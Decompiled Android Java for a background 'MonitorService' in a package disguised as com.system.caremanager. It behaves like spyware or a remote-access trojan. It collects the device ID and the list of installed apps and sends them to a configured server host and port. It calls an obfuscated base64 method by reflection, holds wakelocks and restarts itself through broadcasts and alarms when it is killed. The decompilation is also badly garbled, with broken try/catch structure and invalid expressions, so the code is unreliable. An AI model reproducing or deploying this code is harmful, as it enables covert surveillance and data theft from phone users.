package com.system.caremanager;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class MonitorService extends Service {

     PowerManager.WakeLock wakeLock;

    public MonitorService() {
        this.wakeLock = null;
        return;
    }

    public static void FPPAGE(String param1) {
        Context appContext = MainBackgroundService.appContext;
        return;
    }

    private void LOGIT(Context param1, Intent param2) {
        try {
            String str = "com.system.caremanager.core";
            Class result = Class.forName(str);
            // continue loop -> :goto_0
            } catch (Exception e) {
                e.printStackTrace();
            result.printStackTrace();
            Object result2 = null.newInstance();
            // continue loop -> :goto_2
            } catch (Exception e) {
                e.printStackTrace();
            result.printStackTrace();
            // continue loop -> :goto_1
            } catch (Exception e) {
                e.printStackTrace();
            result.printStackTrace();
            int val = 2;
            Class[] arr = new Class[val];
            Class cls = Context.class;
            arr[null] = Context.class;
            Class cls2 = Intent.class;
            arr[1] = Intent.class;
            String str2 = "U3RhcnROZXdTY2Fu";
            String result3 = DataPackagingEngine.handleError(str2);
            Method result4 = null.getDeclaredMethod(result, arr);
            // continue loop -> :goto_3
            } catch (Exception e) {
                e.printStackTrace();
            null.printStackTrace();
            Object[] arr2 = new Object[val];
            arr2[null] = param1;
            arr2[1] = param2;
            Object result5 = result.invoke(null, arr2);
            // continue loop -> :goto_4
            } catch (Exception e) {
                e.printStackTrace();
            param1.printStackTrace();
            // continue loop -> :goto_4
            } catch (Exception e) {
                e.printStackTrace();
            param1.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }

    public static void StartScreen(String param1) {
        try {
            Context appContext = MainBackgroundService.appContext;
            if (appContext == null) {
                // branch: cond_1
            }
            String str = "on:";
            boolean result = this.startsWith(str);
            String str2 = "key";
            int val = 8388608;
            int val2 = 268435456;
            if (result == null) {
                // branch: cond_0
            }
            MainBackgroundService.FO_RSC = 1;
            Intent intent = new Intent();
            Context appContext2 = MainBackgroundService.appContext;
            Class cls = MainLauncherActivity.class;
            Intent result2 = intent.addFlags(val2);
            Intent result3 = intent.addFlags(val);
            Intent result4 = intent.putExtra(str2, param1);
            Context appContext3 = MainBackgroundService.appContext;
            this.startActivity(intent);
            // continue loop -> :goto_0
            MainBackgroundService.FO_RSC = null;
            Intent intent2 = new Intent();
            Context appContext4 = MainBackgroundService.appContext;
            Class cls2 = MainLauncherActivity.class;
            Intent result5 = this.addFlags(val2);
            Intent result6 = this.addFlags(val);
            String str3 = "off";
            Intent result7 = this.putExtra(str2, str3);
            Context appContext5 = MainBackgroundService.appContext;
            appContext5.startActivity(intent2);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void openlink(String param1) {
        try {
            Context appContext = MainBackgroundService.appContext;
            if (appContext == null) {
                // branch: cond_0
            }
            Handler handler = new Handler();
            Looper result = Looper.getMainLooper();
            PersistentService.2 persistentService.2 = new PersistentService.2();
            boolean result2 = handler.post(persistentService.2);
            // continue loop -> :goto_0
            } catch (Exception e) {
                e.printStackTrace();
            this.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void p(Context param1) {
        try {
            String str = "NPO";
            String str2 = "NHO";
            String str3 = "NNA";
            String str4 = "";
            ContentResolver result = this.getContentResolver();
            String str5 = "android_id";
            String result2 = Settings.Secure.getString(result, str5);
            StringBuilder stringBuilder = new StringBuilder();
            StringBuilder result3 = stringBuilder.append(result);
            String result4 = stringBuilder.toString();
            // continue loop -> :goto_0
            } catch (Exception e) {
                e.printStackTrace();
            String result5 = InstalledAppsScanner.GD_I(param1);
            ArrayList arrayList = new ArrayList();
            MainBackgroundService.L_i = arrayList;
            ArrayList arrayList2 = new ArrayList();
            MainBackgroundService.L_cl = arrayList2;
            String result6 = My_Settings.read(param1, str3, str4);
            int result7 = result.length();
            if (/* if-lez result */) {
                // branch: cond_0
            }
            String CLINAME = MainBackgroundService.CLINAME;
            String result8 = My_Settings.read(param1, str3, CLINAME);
            MainBackgroundService.CLINAME = result;
            StringBuilder stringBuilder2 = new StringBuilder();
            String CLINAME2 = MainBackgroundService.CLINAME;
            StringBuilder result9 = stringBuilder2.append(CLINAME2);
            String str6 = "|";
            StringBuilder result10 = stringBuilder2.append(str6);
            StringBuilder result11 = stringBuilder2.append(result);
            String result12 = stringBuilder2.toString();
            String FTX0 = InstalledAppsScanner.FTX0;
            String FTX1 = InstalledAppsScanner.FTX1;
            String FTX2 = InstalledAppsScanner.FTX2;
            // continue loop -> :goto_1
            } catch (Exception e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            String serverHost = MainBackgroundService.serverHost;
            String result13 = DataPackagingEngine.handleError(serverHost);
            String serverPort = MainBackgroundService.serverPort;
            String result14 = DataPackagingEngine.handleError(serverPort);
            DataPackagingEngine.dit(param1, result, str4);
            } catch (Exception e) {
                e.printStackTrace();
            String result15 = My_Settings.read(param1, str2, str4);
            int result16 = result.length();
            if (/* if-lez result */) {
                // branch: cond_1
            }
            String serverHost2 = MainBackgroundService.serverHost;
            String result17 = DataPackagingEngine.handleError(serverHost2);
            String result18 = My_Settings.read(param1, str2, result);
            String result19 = My_Settings.read(param1, str, str4);
            int result20 = result.length();
            if (/* if-lez result */) {
                // branch: cond_2
            }
            String serverPort2 = MainBackgroundService.serverPort;
            String result21 = DataPackagingEngine.handleError(serverPort2);
            String result22 = My_Settings.read(param1, str, result);
            DataEncryptionEngine.handleMessage(result, result, param1);
            Context[] arr = new Context[1];
            arr[null] = param1;
            PersistentService.ta persistentService.ta = new PersistentService.ta();
            AsyncTask result23 = this.execute(arr);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void showToast(String param1) {
        Context appContext = MainBackgroundService.appContext;
        if (appContext == null) {
            // branch: cond_0
        }
        Handler handler = new Handler();
        Looper result = Looper.getMainLooper();
        PersistentService.1 persistentService.1 = new PersistentService.1();
        boolean result2 = handler.post(persistentService.1);
        return;
    }

    public IBinder onBind(Intent param1) {
        return null;
    }

    public void onCreate() {
        try {
            this.onCreate();
            Context result = this.getApplicationContext();
            MainBackgroundService.appContext = result;
            Context result2 = this.getApplicationContext();
            String str = "Battery";
            DataPackagingEngine.phonixeffect(result, str, v2, v3);
            String str2 = "power";
            Object result3 = this.getSystemService(str2);
            result = (PowerManager) result;
            PowerManager.WakeLock wakeLock = this.wakeLock;
            if (wakeLock != null) {
                // branch: cond_0
            }
            String str3 = "PeriSecure:MyWakeLock";
            PowerManager.WakeLock result4 = result.newWakeLock(1, str3);
            this.wakeLock = result;
            PowerManager.WakeLock wakeLock2 = this.wakeLock;
            if (wakeLock2 == null) {
                // branch: cond_1
            }
            boolean result5 = wakeLock2.isHeld();
            if (result != null) {
                // branch: cond_1
            }
            PowerManager.WakeLock wakeLock3 = this.wakeLock;
            wakeLock3.acquire();
            Context result6 = this.getApplicationContext();
            String str4 = "01110001";
            DataPackagingEngine.dataProcessor = str4;
            int SDK_INT = Build$VERSION.SDK_INT;
            int val = 26;
            if (SDK_INT < val) {
                // branch: cond_2
            }
            String dataProcessor = DataPackagingEngine.dataProcessor;
            char result7 = dataProcessor.charAt(1);
            char c1 = DataPackagingEngine.c1;
            if (result != c1) {
                // branch: cond_2
            }
            String str5 = "Worker";
            String str6 = "Workers";
            Notification result8 = DataPackagingEngine.Foreground(result, str5, str6);
            if (result == null) {
                // branch: cond_2
            }
            int val2 = 9594;
            this.startForeground(val2, result);
            } catch (Exception e) {
                e.printStackTrace();
            String str7 = "sysdata";
            InstalledAppsScanner.FTX0 = str7;
            String str8 = "appdata";
            InstalledAppsScanner.FTX1 = str8;
            String str9 = "configrs";
            InstalledAppsScanner.FTX2 = str9;
            String str10 = "sysinfo";
            InstalledAppsScanner.FTX3 = str10;
            ThreadPoolExecutor threadPoolExecutor = new ThreadPoolExecutor();
            int val3 = 8;
            int val4 = 15;
            TimeUnit MINUTES = TimeUnit.MINUTES;
            ArrayBlockingQueue arrayBlockingQueue = new ArrayBlockingQueue();
            int m_ax = DataPackagingEngine.m_ax;
            DataPackagingEngine.e_xc = threadPoolExecutor;
            PersistentService.p(p0);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onDestroy() {
        try {
            this.onDestroy();
            DataPackagingEngine.s_f0 = null;
            Context result = this.getApplicationContext();
            String str = "iamdone";
            DataPackagingEngine.phonixeffect(result, str, v2, v3);
            } catch (Exception e) {
                e.printStackTrace();
            Intent intent = new Intent();
            Context result2 = this.getApplicationContext();
            Class cls = RestartSensorReceiver.class;
            String str2 = "RestartSensor";
            Intent result3 = intent.setAction(str2);
            this.sendBroadcast(result);
            } catch (Exception e) {
                e.printStackTrace();
            PowerManager.WakeLock wakeLock = this.wakeLock;
            if (wakeLock == null) {
                // branch: cond_0
            }
            boolean result4 = wakeLock.isHeld();
            if (result != 1) {
                // branch: cond_0
            }
            PowerManager.WakeLock wakeLock2 = this.wakeLock;
            wakeLock2.release();
            this.stopForeground(1);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public int onStartCommand(Intent param1, int param2, int param3) {
        return 1;
    }

    public void onTaskRemoved(Intent param1) {
        try {
            Context result = this.getApplicationContext();
            String str = "Scanner";
            DataPackagingEngine.phonixeffect(result, str, v2, v3);
            Intent intent = new Intent();
            Context result2 = this.getApplicationContext();
            Class result3 = this.getClass();
            String result4 = this.getPackageName();
            Intent result5 = intent.setPackage(result);
            Context result6 = this.getApplicationContext();
            int val = 1073741824;
            PendingIntent result7 = PendingIntent.getService(result, 1, intent, val);
            Context result8 = this.getApplicationContext();
            String str2 = "alarm";
            Object result9 = result.getSystemService(str2);
            result = (AlarmManager) result;
            long result10 = SystemClock.elapsedRealtime();
            long longVal = v6 + v6;
            int val2 = 3;
            result.set(val2, longVal, v5, result);
            PowerManager.WakeLock wakeLock = this.wakeLock;
            boolean result11 = wakeLock.equals(null);
            if (result != null) {
                // branch: cond_0
            }
            PowerManager.WakeLock wakeLock2 = this.wakeLock;
            boolean result12 = wakeLock2.isHeld();
            if (result != 1) {
                // branch: cond_0
            }
            PowerManager.WakeLock wakeLock3 = this.wakeLock;
            wakeLock3.release();
            } catch (Exception e) {
                e.printStackTrace();
            this.onTaskRemoved(param1);
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}